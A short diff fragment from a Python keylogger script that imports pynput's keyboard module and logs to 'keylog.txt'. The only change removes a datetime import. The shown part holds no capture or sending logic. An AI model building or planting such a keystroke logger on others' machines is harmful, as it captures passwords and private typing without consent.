@@ -1,7 +1,6 @@
 #install pynput before applying the code
 
 from pynput import keyboard
-from datetime import datetime
 
 log_file = "keylog.txt"
 
